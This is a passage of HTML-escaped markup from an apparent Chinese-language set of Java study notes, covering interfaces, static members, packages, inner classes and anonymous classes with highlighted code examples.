&lt;li>一个类可以实现多个接口，一个接口也可以继承自另一个接口&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 实现了两个interface
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 继承另一个接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>在接口中，可以定义&lt;code>default&lt;/code>方法；&lt;code>default&lt;/code>方法和抽象类的普通方法是有所不同的。因为&lt;code>interface&lt;/code>没有字段，&lt;code>default&lt;/code>方法无法访问字段，而抽象类的普通方法可以访问实例字段(Java&amp;gt;=1.8)&lt;/li>
&lt;/ul>
&lt;h3 id="静态字段静态方法">静态字段&amp;amp;静态方法&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>用&lt;code>static&lt;/code>关键字修饰的字段处于同一个共享作用域中&lt;/p>
&lt;/li>
&lt;li>
&lt;p>不推荐用&lt;code>实例.静态字段&lt;/code>去访问静态字段，因为在java中实例对象并没有静态字段(实际)，代码中可以访问是因为编译器可以根据实例类型自动转换为&lt;code>类名.静态字段&lt;/code>来访问&lt;/p>
&lt;/li>
&lt;li>
&lt;p>推荐用类名来访问静态字段，可以将其理解为类本身的字段&lt;/p>
&lt;/li>
&lt;li>
&lt;p>调用实例方法必须通过一个实例变量，而调用静态方法则不需要实例变量，通过类名就可以调用&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setNumber&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">number&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">number&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setNumber&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>静态方法内部无法访问&lt;code>this&lt;/code>，也无法访问实例字段，只能访问静态字段&lt;/li>
&lt;li>静态方法常用于工具类，比如&lt;code>Arrays.sort()&lt;/code>和&lt;code>Math.random()&lt;/code>；java程序入口的&lt;code>main&lt;/code>也是静态方法噢&lt;/li>
&lt;li>对于接口而言虽然不能有实例字段，但是可以有&lt;code>public static final&lt;/code>加持的静态字段&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>public interface Person {
public static final int MALE = 1;
public static final int FEMALE = 2;
}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 可简写
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 编译器会自动加上public statc final:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">MALE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">FEMALE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="包">包&lt;/h3>
&lt;ul>
&lt;li>使用package包来解决名字冲突（各个语言都有了 很好懂），可以用类的全名&lt;/li>
&lt;li>包没有父子关系！java.util和java.util.zip是不同的包，两者没有任何继承关系&lt;/li>
&lt;li>所有Java文件对应的目录层次要和包的层次一致，编译后的&lt;code>.class&lt;/code>文件也需要按照包结构存放&lt;/li>
&lt;li>位于同一个包的类，可以访问包作用域的字段和方法。不用&lt;code>public&lt;/code>、&lt;code>protected&lt;/code>、&lt;code>private&lt;/code>修饰的字段和方法就是包作用域&lt;/li>
&lt;li>&lt;code>import static&lt;/code>可以导入可以导入一个类的静态字段和静态方法&lt;/li>
&lt;li>Java编译器最终编译出的&lt;code>.class&lt;/code>文件只使用完整类名(超长)，所以编译器在遇到&lt;code>class&lt;/code>名称时如果非完整类名，按照 当前package-&amp;gt;import的包-&amp;gt;java.lang包 的顺序进行查找&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Main.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">test&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.text.Format&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">List&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ok，使用完整类名 -&amp;gt; java.util.List
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Format&lt;/span> &lt;span style="color:#111">format&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ok，使用import的类 -&amp;gt; java.text.Format
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;hi&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ok，使用java.lang包的String -&amp;gt; java.lang.String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// ok，使用java.lang包的System -&amp;gt; java.lang.System
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">MessageFormat&lt;/span> &lt;span style="color:#111">mf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 编译错误：无法找到MessageFormat: MessageFormat cannot be resolved to a type
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>编写class时，编译器自动帮我们&lt;code>import java.lang.*&lt;/code>(不包含&lt;code>java.lang.reflect&lt;/code>这样的包)和&lt;code>import&lt;/code>当前&lt;code>package&lt;/code>的其它class&lt;/li>
&lt;li>把方法定义为&lt;code>package&lt;/code>权限有助于测试，因为测试类和被测试类只要位于同一个&lt;code>package&lt;/code>，测试代码就可以访问被测试类的&lt;code>package&lt;/code>权限方法&lt;/li>
&lt;/ul>
&lt;h3 id="内部类">内部类&lt;/h3>
&lt;ul>
&lt;li>或称nested class嵌套类&lt;/li>
&lt;li>Inner Class定义在一个类的内部，它的实例不能单独存在&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span> &lt;span style="color:#111">outer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Nested&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 实例化一个Outer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Inner&lt;/span> &lt;span style="color:#111">inner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">new&lt;/span> &lt;span style="color:#75af00">Inner&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 实例化一个Inner
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">inner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 调用Outer的构造方法来创建Inner实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Inner&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>原因是Inner Class除了&lt;code>this&lt;/code>指向自己以外还隐含地持有一个Outer Class实例，可以用&lt;code>Outer.this&lt;/code>访问这个实例；所以，实例化一个Inner Class不能脱离Outer实例&lt;/p>
&lt;p>Inner Class和普通Class相比，除了能引用Outer实例外，还有一个额外的特权：可以修改Outer Class的&lt;code>private&lt;/code>字段；因为Inner Class的作用域在Outer Class内部，所以能访问Outer Class的&lt;code>private&lt;/code>字段和方法&lt;/p>
&lt;p>观察Java编译器编译后的&lt;code>.class&lt;/code>文件可以发现，&lt;code>Outer&lt;/code>类被编译为&lt;code>Outer.class&lt;/code>，而&lt;code>Inner&lt;/code>类被编译为&lt;code>Outer$Inner.class&lt;/code>&lt;/p>
&lt;ul>
&lt;li>还可以通过匿名类Anonymous Class来定义Inner Class，两者本质上相同&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span> &lt;span style="color:#111">outer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Nested&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asyncHello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">asyncHello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runnable&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Runnabale&lt;/code>本身是不能实例化的接口，这里实际定义了一个实现了&lt;code>Runnable&lt;/code>接口的匿名类，并通过new实例化 之后转型为Runnable，过程很多但是实现起来代码很简洁；和Inner Class一样也可以访问Outer Class的&lt;code>private&lt;/code>&lt;/p>
&lt;ul>
&lt;li>匿名类在定义时必须实例化，最终会编译为&lt;code>Outer$1.class&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Runnable&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实现必要的抽象方法...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>继承自普通类的匿名类，编译为&lt;code>Main$1.class&lt;/code>和&lt;code>Main$2.class&lt;/code>两个匿名类文件&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
